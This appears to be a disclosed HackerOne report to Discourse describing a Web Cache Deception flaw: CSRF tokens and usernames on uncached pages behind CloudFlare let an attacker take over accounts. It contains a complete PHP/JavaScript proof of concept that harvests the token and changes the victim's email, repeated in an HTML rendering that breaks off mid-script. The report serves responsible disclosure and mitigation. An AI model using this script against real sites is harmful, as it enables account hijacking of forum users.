{"id":260697,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNjA2OTc=","url":"https://hackerone.com/reports/260697","title":"CSRF-tokens on pages without no-cache headers, resulting in ATO when using CloudFlare proxy (Web Cache Deception)","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2017-08-16T13:06:55.522Z","submitted_at":"2017-08-16T13:06:55.522Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"fransrosen","url":"/fransrosen","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":16893,"url":"https://hackerone.com/discourse","handle":"discourse","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/016/893/0bc08a2076b0f1f4a2c58636b8171b32cc367a52_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/893/0bc08a2076b0f1f4a2c58636b8171b32cc367a52_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Discourse","twitter_handle":"discourse","website":"https://discourse.org","about":"Discourse is JavaScript (ember.js) and Ruby on Rails based 100% open source discussion software -- https://github.com/discourse/discourse"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2018-08-08T18:00:12.220Z","bug_reporter_agreed_on_going_public_at":"2018-07-09T18:00:09.574Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi,\n\nI noticed this issue on one of your clients which was using CloudFlare in front of their Discourse. This is not affecting `try.discourse.org` but the same underlying issue can be seen there as well even though it's not exploitable on that specific domain.\n\nThe TL;DR of issue is basically: `Discourse instance is vulnerable to account takeover if Discourse is served behind a CloudFlare proxy due to the lack of no-cache headers on pages with CSRF-tokens`.\n\nAs you might understand due to this, the PoC below is not working on `try.discourse.org`. I haven't provided any other example, but let me know if I should do a trial version setting it up behind CloudFlare myself. My guess is that you maybe want to try this out yourself, since you want to verify that the vanilla setup in CloudFlare still makes Discourse vulnerable.\n\n### Background\n\nYou might have heard about the Web Cache Deception attack. The idea is basically to fool the cache proxy, in this case CloudFlare, to cache content which belongs to the victim inside the CloudFlare proxy layer. This makes it possible for anyone in the same CloudFlare region to fetch the leaked data without any authentication. \n\nAny URL having a file ending with one of [CloudFlare's mime types](https://support.cloudflare.com/hc/en-us/articles/200172516-Which-file-extensions-does-Cloudflare-cache-for-static-content-) will be cached for the whole region. Remember, a region is **big** and there are only 13 of them in total (in my case, the region is Western Europe). Here's a reference from [CloudFlare about their regions](https://support.cloudflare.com/hc/en-us/articles/115000540888-Load-Balancing-Geographic-Regions).\n\nThis attack vector was coined by **Omer Gil** earlier this year ( https://www.slideshare.net/OmerGil/web-cache-deception-attack ).\n\n### Technical details\n\nThe issue with Discourse is that there's a lot of routes which all of them exposes the user's CSRF-token as well as the user's username in the header. This applies not only to status `200` but also to status `404`.\n\nHere are some routes which will return status `200` on `try.discourse.org` even if we have appended `.css` on them (which is a trigger for CloudFlare to cache this URL):\n\n```\n/u/my/preferences.css\n/u/my/preferences/username.css\n/u/my/preferences/card-badge.css\n```\nResults in:\n\n```\nHTTP/1.1 200 OK\nX-Discourse-Route: users/preferences\n\nHTTP/1.1 200 OK\nX-Discourse-Route: users/preferences\n\nHTTP/1.1 200 OK\nX-Discourse-Route: users/card_badge\n```\n(This seems to be a general issue with the `X-Discourse-Route: users/*` routes)\n\nAlso, the normal 404-page actually reveals the current user's CSRF token (this request is done while being signed in):\n\n```\nGET /u/x.css HTTP/1.1\nHost: try.discourse.org\n\n\u003cmeta name=\"csrf-token\" content=\"aYBW0N/1nfI1PHBa24YNx+...+BJJX+Fg==\" /\u003e\n```\n\nYou currently don't have `try.discourse.org` behind CloudFlare, but I've verified with a few instances that I noticed did.\n\nWhat you will see is the following:\n\nIssuing the following request twice while being signed in:\n\n```\nGET /u/x.css HTTP/1.1\n```\n\nWill lead to:\n```\nCF-Cache-Status: HIT\n```\n\nAs well as:\n\n```\nX-Discourse-Username: test\n\n\u003cmeta name=\"csrf-token\" content=\"6bE...VnlQ==\" /\u003e\n```\n\nSame thing with `/u/my/preferences.css`.\n\nThe issue is that none of these routes, exposing the CSRF-token and the username, has any `Pragma`, `Cache-Control` or `Expire`-headers, so there's nothing that tells CloudFlare not to cache these URLs.\n\n### PoC\n\nYou need an instance behind a CloudFlare-proxy, with no settings more than just enabling CloudFlare on the domain:\n\n{F213373}\n\nNow, we can use the following script as a PoC, remember that if we would attack someone, we would need to fetch the URL server-side from the same CloudFlare-region as the victim. This should be no problem, since there's only 13 regions in total.\n\nWhat this script will do is this:\n\n1. Victim is signed in to a Discourse instance which is behind a CloudFlare-proxy\n2. Victim vists a malicious page by the attacker\n3. The page will issue three requests using `img`-tags to `/u/$rand.css`, to make sure that the CloudFlare cache is tainted with the current user and its CSRF-token\n4. After the images has loaded, the PHP-script will fetch the same URL server-side, which requires the PHP-script to be in the same CloudFlare region (my region right now for example is Western Europe).\n5. The script will extract the username from the `X-Discourse-Username` header and the CSRF-token from the HTML\n6. The PHP-script will return these two values to the malicious site, and a form will be crafted:\n```\nPOST /users/$username/preferences/email.json HTTP/1.1\nÂ \n_method=PUT\u0026email=$attacker_email\u0026authenticity_token=$csrf_token\n```\n   \n7. Email is now changed for the victim, the attacker will get a verification email. When attacker have clicked on the verification email, the email is now changed. The victim will however get an email saying the email was changed, but the change has already happened.\n\nHere's the script. It seems like `_forum_session`-token has `SameSite=lax` which is great, however, this is not yet implemented in Firefox, so try this in Firefox. You need to point it to an instance which is behind CloudFlare proxy.\n\n```php\n\u003c?\n$discourse = \"https://discourse.instance.behind.cloudflare.proxy\"; //like https://try.discourse.org but behind CloudFlare\n$email_to_change_to = \"changetothis@example.com\";\n\nif(!empty($_GET['fetch'])) {\n\t$f = @intval($_GET['f']);\n\t$ctx = stream_context_create(array('http' =\u003e array('ignore_errors' =\u003e true)));\n\t$data = file_get_contents($discourse.'/u/'.$f.'.css', false, $ctx);\n\tpreg_match('/name=\"csrf-token\" content=\"([a-zA-Z0-9\\/=+]+)\"/', $data, $matches);\n\tif(!empty($matches[1])) {\n\t\tpreg_match('/X-Discourse-Username: (.*)/', implode(\"\\n\", $http_response_header), $name_matches);\n\t\techo $matches[1].';'.$name_matches[1];\n\t} else {\n\t\techo 'error';\n\t}\n\texit;\n}\n#random file to taint with csrf-token\n$rand = mt_rand(100000,999999);\n?\u003e\n\u003chtml\u003e\n  \u003cbody\u003e\n\t\u003cimg src=\"\u003c?=$discourse?\u003e/u/\u003c?=$rand?\u003e.css\" /\u003e\n\t\u003cimg src=\"\u003c?=$discourse?\u003e/u/\u003c?=$rand?\u003e.css\" /\u003e\n\t\u003cimg src=\"\u003c?=$discourse?\u003e/u/\u003c?=$rand?\u003e.css\" onerror=\"f()\" /\u003e\n\u003cscript\u003e\nvar user = '', change_email_to = '\u003c?=$email_to_change_to?\u003e';\nfunction f() {\n\tfetch('?fetch=1\u0026f=\u003c?=$rand?\u003e').then(function(e){return e.text()}).then(function(e){\n\t\tif(e == 'error') { alert('You are currently running the PHP on a different Cloudflare region'); return; }\n\t\tuser = e.split(';')[1];\n\t\tdocument.getElementById('f').action = '\u003c?=$discourse?\u003e/users/'+user+'/preferences/email'\n\t\tsubmitRequest(e.split(';')[0])\n\t})\n}\nfunction submitRequest(csrf) {\n  var xhr = new XMLHttpRequest();\n  xhr.onerror = function () {\n    console.log(xhr.readyState)\n\tif(xhr.readyState == 4) {\n\t\talert('Account email for ' + user + ' has been changed to: ' + change_email_to);\n\t}\n  };\n  xhr.open(\"POST\", \"\u003c?=$discourse?\u003e/users/\"+user+\"/preferences/email.json\", true);\n  xhr.setRequestHeader(\"Accept\", \"text\\/html\");\n  xhr.setRequestHeader(\"Content-Type\", \"application\\/x-www-form-urlencoded\");\n  xhr.withCredentials = true;\n  var body = \"_method=PUT\u0026email=\" + encodeURIComponent(change_email_to) +\"\u0026authenticity_token=\" + encodeURIComponent(csrf);\n  var aBody = new Uint8Array(body.length);\n  for (var i = 0; i \u003c aBody.length; i++)\n    aBody[i] = body.charCodeAt(i); \n  xhr.send(new Blob([aBody]));\n}\n\u003c/script\u003e\n    \u003cform action=\"\" id=\"f\" method=\"POST\"\u003e\n      \u003cinput type=\"hidden\" name=\"\u0026#95;method\" value=\"PUT\" /\u003e\n      \u003cinput type=\"hidden\" name=\"email\" value=\"\u003c?=$email_to_change_to?\u003e\" /\u003e\n      \u003cinput type=\"hidden\" name=\"authenticity\u0026#95;token\" id=\"csrf\" value=\"\" /\u003e\n      \u003cinput type=\"submit\" style=\"display: none;\" value=\"Submit request\" /\u003e\n\t  Please wait...\n    \u003c/form\u003e\n  \u003c/body\u003e\n\u003c/html\u003e\n```\n\nIf you try this against a Discourse instance while being signed in, you should see something like this when visiting this script:\n\n{F213374}\n\n### Mitigations\n\nAdd the `no-cache` headers, `Cache-Control` and/or `Expire` on any of the templates that outputs the CSRF-token, this will prevent CloudFlare from caching information which is user specific. I would also recommend doing the same thing when the `X-Discourse-Username` is returned.\n\nLet me know if you need any additional information.\n\nRegards,\nFrans","vulnerability_information_html":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eI noticed this issue on one of your clients which was using CloudFlare in front of their Discourse. This is not affecting \u003ccode\u003etry.discourse.org\u003c/code\u003e but the same underlying issue can be seen there as well even though it\u0026#39;s not exploitable on that specific domain.\u003c/p\u003e\n\n\u003cp\u003eThe TL;DR of issue is basically: \u003ccode\u003eDiscourse instance is vulnerable to account takeover if Discourse is served behind a CloudFlare proxy due to the lack of no-cache headers on pages with CSRF-tokens\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eAs you might understand due to this, the PoC below is not working on \u003ccode\u003etry.discourse.org\u003c/code\u003e. I haven\u0026#39;t provided any other example, but let me know if I should do a trial version setting it up behind CloudFlare myself. My guess is that you maybe want to try this out yourself, since you want to verify that the vanilla setup in CloudFlare still makes Discourse vulnerable.\u003c/p\u003e\n\n\u003ch3 id=\"background\"\u003eBackground\u003c/h3\u003e\n\n\u003cp\u003eYou might have heard about the Web Cache Deception attack. The idea is basically to fool the cache proxy, in this case CloudFlare, to cache content which belongs to the victim inside the CloudFlare proxy layer. This makes it possible for anyone in the same CloudFlare region to fetch the leaked data without any authentication. \u003c/p\u003e\n\n\u003cp\u003eAny URL having a file ending with one of \u003ca href=\"/redirect?url=https%3A%2F%2Fsupport.cloudflare.com%2Fhc%2Fen-us%2Farticles%2F200172516-Which-file-extensions-does-Cloudflare-cache-for-static-content-\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eCloudFlare\u0026#39;s mime types\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e will be cached for the whole region. Remember, a region is \u003cstrong\u003ebig\u003c/strong\u003e and there are only 13 of them in total (in my case, the region is Western Europe). Here\u0026#39;s a reference from \u003ca href=\"/redirect?url=https%3A%2F%2Fsupport.cloudflare.com%2Fhc%2Fen-us%2Farticles%2F115000540888-Load-Balancing-Geographic-Regions\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eCloudFlare about their regions\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eThis attack vector was coined by \u003cstrong\u003eOmer Gil\u003c/strong\u003e earlier this year ( \u003ca title=\"https://www.slideshare.net/OmerGil/web-cache-deception-attack\" href=\"/redirect?url=https%3A%2F%2Fwww.slideshare.net%2FOmerGil%2Fweb-cache-deception-attack\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.slideshare.net/OmerGil/web-cache-deception-attack\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e ).\u003c/p\u003e\n\n\u003ch3 id=\"technical-details\"\u003eTechnical details\u003c/h3\u003e\n\n\u003cp\u003eThe issue with Discourse is that there\u0026#39;s a lot of routes which all of them exposes the user\u0026#39;s CSRF-token as well as the user\u0026#39;s username in the header. This applies not only to status \u003ccode\u003e200\u003c/code\u003e but also to status \u003ccode\u003e404\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eHere are some routes which will return status \u003ccode\u003e200\u003c/code\u003e on \u003ccode\u003etry.discourse.org\u003c/code\u003e even if we have appended \u003ccode\u003e.css\u003c/code\u003e on them (which is a trigger for CloudFlare to cache this URL):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e/u/my/preferences.css\n/u/my/preferences/username.css\n/u/my/preferences/card-badge.css\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eResults in:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eHTTP/1.1 200 OK\nX-Discourse-Route: users/preferences\n\nHTTP/1.1 200 OK\nX-Discourse-Route: users/preferences\n\nHTTP/1.1 200 OK\nX-Discourse-Route: users/card_badge\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e(This seems to be a general issue with the \u003ccode\u003eX-Discourse-Route: users/*\u003c/code\u003e routes)\u003c/p\u003e\n\n\u003cp\u003eAlso, the normal 404-page actually reveals the current user\u0026#39;s CSRF token (this request is done while being signed in):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET /u/x.css HTTP/1.1\nHost: try.discourse.org\n\n\u0026lt;meta name=\u0026quot;csrf-token\u0026quot; content=\u0026quot;aYBW0N/1nfI1PHBa24YNx+...+BJJX+Fg==\u0026quot; /\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eYou currently don\u0026#39;t have \u003ccode\u003etry.discourse.org\u003c/code\u003e behind CloudFlare, but I\u0026#39;ve verified with a few instances that I noticed did.\u003c/p\u003e\n\n\u003cp\u003eWhat you will see is the following:\u003c/p\u003e\n\n\u003cp\u003eIssuing the following request twice while being signed in:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET /u/x.css HTTP/1.1\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWill lead to:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eCF-Cache-Status: HIT\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAs well as:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eX-Discourse-Username: test\n\n\u0026lt;meta name=\u0026quot;csrf-token\u0026quot; content=\u0026quot;6bE...VnlQ==\u0026quot; /\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSame thing with \u003ccode\u003e/u/my/preferences.css\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eThe issue is that none of these routes, exposing the CSRF-token and the username, has any \u003ccode\u003ePragma\u003c/code\u003e, \u003ccode\u003eCache-Control\u003c/code\u003e or \u003ccode\u003eExpire\u003c/code\u003e-headers, so there\u0026#39;s nothing that tells CloudFlare not to cache these URLs.\u003c/p\u003e\n\n\u003ch3 id=\"poc\"\u003ePoC\u003c/h3\u003e\n\n\u003cp\u003eYou need an instance behind a CloudFlare-proxy, with no settings more than just enabling CloudFlare on the domain:\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screen_Shot_2017-08-16_at_14.07.00.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/213/373/497fa800c168379e2b4afa85cc365d59676b36e2/Screen_Shot_2017-08-16_at_14.07.00.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2017-08-16_at_14.07.00.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2017-08-16_at_14.07.00.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ4HB4ZZGG%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T051452Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIFBKbMTaGKwVCK0x7JNAOijlMVw%2BhW%2FIG%2FoSYnjiHiHKAiALX1HXrCEc%2FI%2FnVrq803X%2FALiQpBxAlCHE%2Bh8zwqcfmSq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM1pLsQIVwlUu9%2FWdzKpEDno5dfN3IVf%2B7OsdAYS9SWEsPaEcB2YetTOtoMoT8QkXafStRJxQSEckvansRxadLw3NEtOPJvUCKQ1FSfSh7PFvC6uVfFJETqBnLL3fMQIGcAQZlOES1A7KCuxJT2s%2FayJYm9KXYzydI49kvJbjn3MhPgu4OzSnr601lrMTBegiJpfNO%2B%2FeSktzRhCINpAxF%2F2a4j2lstKLfaje8wR6hRJqdSRWJF9M8hMiccij8fb6xzNCHJahS%2BfaEo7RLAy5%2FPpBxYVi3ogO%2Bi%2F4BRT3eb1Z9RpGG9qNkGuyY7ce3DvMgdTkSjHBcsYXBywd8fd%2BaBZwWJd5uw351hwVm22gEjaBsMXjDBuKYWVQcA%2BrEoUuOGGuH6bDr%2B2WdDMHHXX7MgZgH7ziMbq2HG%2FZKMv1Xym51QlR6qp3%2BP6Xz3oMScAiG6Dqm%2FjDmNx9bwBHdu7tvsWABnhe6esdM9Fno0WZ3lIkHOq4HRIf10Qe%2BDDAUhhVc45YNdWlThBy0I6Le7VinfP6o%2F%2BKPpdhWEDht%2BPKwSuwwvNGq%2FwU67AHczVFtKf2TPLO9ophgOhkJ%2BZe077T3hvPbRZ7D4GzMnizYODRG9nQWzx68CzHlMuom3RU16aBeESIBNhc9NjST%2Bt3Bw%2FkvdjiPIAwfnnl0ATW5KpAuIAujTjCnWWC5x9o79v0x9%2Bnkl%2BlSYo41rg7HDE%2BhHWG7fKOUzGpWpyUJFwUo4XO2BBz%2F9JPwjpoD5vZa6vKnLi1NmWkYRn1R6E4QMqIGHABVzTr2BlnRNMM7IY6DbFqrNpuXMJjVs26ZuTl70H1lwMzeG43ORGVGlYhsYokTZrRPzq8ZdhxoEwkFN0OgfU2QSH1HVj5iow%3D%3D\u0026amp;X-Amz-Signature=2bf5772cbc1cc23943614be89338b4abeb464513e20ff573b018fd620e2b1b47\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/213/373/497fa800c168379e2b4afa85cc365d59676b36e2/Screen_Shot_2017-08-16_at_14.07.00.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2017-08-16_at_14.07.00.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2017-08-16_at_14.07.00.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ4HB4ZZGG%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T051452Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIFBKbMTaGKwVCK0x7JNAOijlMVw%2BhW%2FIG%2FoSYnjiHiHKAiALX1HXrCEc%2FI%2FnVrq803X%2FALiQpBxAlCHE%2Bh8zwqcfmSq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM1pLsQIVwlUu9%2FWdzKpEDno5dfN3IVf%2B7OsdAYS9SWEsPaEcB2YetTOtoMoT8QkXafStRJxQSEckvansRxadLw3NEtOPJvUCKQ1FSfSh7PFvC6uVfFJETqBnLL3fMQIGcAQZlOES1A7KCuxJT2s%2FayJYm9KXYzydI49kvJbjn3MhPgu4OzSnr601lrMTBegiJpfNO%2B%2FeSktzRhCINpAxF%2F2a4j2lstKLfaje8wR6hRJqdSRWJF9M8hMiccij8fb6xzNCHJahS%2BfaEo7RLAy5%2FPpBxYVi3ogO%2Bi%2F4BRT3eb1Z9RpGG9qNkGuyY7ce3DvMgdTkSjHBcsYXBywd8fd%2BaBZwWJd5uw351hwVm22gEjaBsMXjDBuKYWVQcA%2BrEoUuOGGuH6bDr%2B2WdDMHHXX7MgZgH7ziMbq2HG%2FZKMv1Xym51QlR6qp3%2BP6Xz3oMScAiG6Dqm%2FjDmNx9bwBHdu7tvsWABnhe6esdM9Fno0WZ3lIkHOq4HRIf10Qe%2BDDAUhhVc45YNdWlThBy0I6Le7VinfP6o%2F%2BKPpdhWEDht%2BPKwSuwwvNGq%2FwU67AHczVFtKf2TPLO9ophgOhkJ%2BZe077T3hvPbRZ7D4GzMnizYODRG9nQWzx68CzHlMuom3RU16aBeESIBNhc9NjST%2Bt3Bw%2FkvdjiPIAwfnnl0ATW5KpAuIAujTjCnWWC5x9o79v0x9%2Bnkl%2BlSYo41rg7HDE%2BhHWG7fKOUzGpWpyUJFwUo4XO2BBz%2F9JPwjpoD5vZa6vKnLi1NmWkYRn1R6E4QMqIGHABVzTr2BlnRNMM7IY6DbFqrNpuXMJjVs26ZuTl70H1lwMzeG43ORGVGlYhsYokTZrRPzq8ZdhxoEwkFN0OgfU2QSH1HVj5iow%3D%3D\u0026amp;X-Amz-Signature=2bf5772cbc1cc23943614be89338b4abeb464513e20ff573b018fd620e2b1b47\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eNow, we can use the following script as a PoC, remember that if we would attack someone, we would need to fetch the URL server-side from the same CloudFlare-region as the victim. This should be no problem, since there\u0026#39;s only 13 regions in total.\u003c/p\u003e\n\n\u003cp\u003eWhat this script will do is this:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eVictim is signed in to a Discourse instance which is behind a CloudFlare-proxy\u003c/li\u003e\n\u003cli\u003eVictim vists a malicious page by the attacker\u003c/li\u003e\n\u003cli\u003eThe page will issue three requests using \u003ccode\u003eimg\u003c/code\u003e-tags to \u003ccode\u003e/u/$rand.css\u003c/code\u003e, to make sure that the CloudFlare cache is tainted with the current user and its CSRF-token\u003c/li\u003e\n\u003cli\u003eAfter the images has loaded, the PHP-script will fetch the same URL server-side, which requires the PHP-script to be in the same CloudFlare region (my region right now for example is Western Europe).\u003c/li\u003e\n\u003cli\u003eThe script will extract the username from the \u003ccode\u003eX-Discourse-Username\u003c/code\u003e header and the CSRF-token from the HTML\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eThe PHP-script will return these two values to the malicious site, and a form will be crafted:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST /users/$username/preferences/email.json HTTP/1.1\nÂ \n_method=PUT\u0026amp;email=$attacker_email\u0026amp;authenticity_token=$csrf_token\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eEmail is now changed for the victim, the attacker will get a verification email. When attacker have clicked on the verification email, the email is now changed. The victim will however get an email saying the email was changed, but the change has already happened.\u003c/p\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eHere\u0026#39;s the script. It seems like \u003ccode\u003e_forum_session\u003c/code\u003e-token has \u003ccode\u003eSameSite=lax\u003c/code\u003e which is great, however, this is not yet implemented in Firefox, so try this in Firefox. You need to point it to an instance which is behind CloudFlare proxy.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$discourse\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;https://discourse.instance.behind.cloudflare.proxy\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"c1\"\u003e//like https://try.discourse.org but behind CloudFlare\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$email_to_change_to\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;changetothis@example.com\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"k\"\u003eempty\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$_GET\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;fetch\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nv\"\u003e$f\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e@\u003c/span\u003e\u003cspan class=\"nb\"\u003eintval\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$_GET\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;f\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\n    \u003cspan class=\"nv\"\u003e$ctx\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003estream_context_create\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;http\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;ignore_errors\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e)));\u003c/span\u003e\n    \u003cspan class=\"nv\"\u003e$data\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003efile_get_contents\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$discourse\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;/u/\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nv\"\u003e$f\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;.css\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$ctx\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"nb\"\u003epreg_match\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;/name=\u0026quot;csrf-token\u0026quot; content=\u0026quot;([a-zA-Z0-9\\/=+]+)\u0026quot;/\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$data\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$matches\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"k\"\u003eempty\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan 